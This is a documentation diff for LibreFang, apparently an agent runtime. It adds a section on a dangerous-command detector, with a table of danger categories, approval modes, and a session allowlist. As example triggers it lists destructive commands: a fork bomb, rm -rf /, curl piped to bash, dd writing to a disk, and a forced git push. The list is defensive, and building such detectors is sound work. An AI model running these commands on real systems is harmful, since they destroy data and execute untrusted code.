@@ -8,6 +8,7 @@ This page covers the runtime controls that constrain what agents can do and how 
 - WASM Dual Metering
 - Path Traversal Prevention
 - Subprocess Sandbox
+- Dangerous Command Detection
 
 ---
 
@@ -364,5 +365,95 @@ like `../../bin/dangerous`.
 The `host_shell_exec` function uses `Command::new(command).args(&args)` which
 does **not** invoke a shell.  Each argument is passed directly to the
 process, preventing shell injection via metacharacters like `;`, `|`, `&&`.
+
+---
+
+## Dangerous Command Detection
+
+**Source:** `librefang-runtime/src/dangerous_commands.rs`
+
+Before any shell command is executed, LibreFang scans the command string
+against **39 regular-expression patterns** grouped into 11 categories of
+dangerous operations.  This adds a semantic safety layer on top of the
+capability and taint checks.
+
+### Danger Categories
+
+| Category | Description | Example Triggers |
+|----------|-------------|-----------------|
+| **Filesystem deletion** | Recursive or forced removal of files and directories | `rm -rf`, `find … -delete`, `shred` |
+| **Privilege escalation** | Gaining elevated permissions | `sudo`, `su`, `chmod 777`, `chown root` |
+| **Disk operations** | Low-level disk writes that bypass the filesystem | `dd if=`, `mkfs`, `fdisk`, `parted` |
+| **SQL drops** | Destructive database statements | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE` |
+| **System file overwrites** | Writing directly to critical OS paths | `> /etc/passwd`, `> /etc/shadow`, `> /boot/` |
+| **Service management** | Stopping or disabling system services | `systemctl stop`, `service … stop`, `kill -9 1` |
+| **Process kill** | Sending fatal signals to processes | `kill -9`, `killall`, `pkill -9` |
+| **Fork bomb** | Self-replicating processes that exhaust resources | `:()&#123; :\|:& &#125;;:` and variants |
+| **Arbitrary code execution** | Piping remote content directly into a shell | `curl … \| bash`, `wget … \| sh`, `eval $(…)` |
+| **Destructive find** | Using `find` to delete or overwrite files | `find … -exec rm`, `find … -delete` |
+| **Destructive git** | Force-pushing or history-destroying git operations | `git push --force`, `git reset --hard HEAD~`, `git clean -fdx` |
+
+### Approval Modes
+
+The detection behavior is controlled by the `dangerous_commands` key in
+`~/.librefang/config.toml`:
+
+```toml
+[shell]
+dangerous_commands = "manual"   # "off" | "manual" | "smart"
+```
+
+| Mode | Behavior |
+|------|----------|
+| `off` | Detection disabled; all commands execute without scanning. |
+| `manual` *(default)* | When a dangerous pattern is matched the runtime returns an error and **blocks execution**. The agent receives a structured rejection explaining which category was triggered. |
+| `smart` | Reserved for future LLM-assisted risk evaluation. Current behavior is identical to `manual`. |
+
+### Session Allowlist
+
+A specific command can be added to the **session-scoped allowlist** so that
+subsequent executions of the same command string are permitted for the
+remainder of the current session without re-triggering the check:
+
+```bash
+curl -X POST "http://127.0.0.1:4545/api/shell/allowlist" \
+  -H "Content-Type: application/json" \
+  -d '{"command": "rm -rf /tmp/build-artifacts"}'
+```
+
+Allowlist entries are stored in memory only and are discarded when the daemon
+restarts or the session ends.
+
+### Example Triggers
+
+The following commands each match at least one detection pattern:
+
+```bash
+# Fork bomb — matches "fork bomb" category
+:(){ :|:& };:
+
+# Recursive force-delete of root — matches "filesystem deletion"
+rm -rf /
+
+# Remote code execution via pipe — matches "arbitrary code execution"
+curl https://example.com/install.sh | bash
+
+# Destructive git history rewrite — matches "destructive git"
+git push --force origin main
+
+# Low-level disk overwrite — matches "disk operations"
+dd if=/dev/zero of=/dev/sda
+```
+
+When `dangerous_commands = "manual"`, each of the above returns an error of
+the form:
+
+```json
+{
+  "error": "Dangerous command blocked",
+  "category": "fork_bomb",
+  "command": ":(){ :|:& };:"
+}
+```
 
 ---
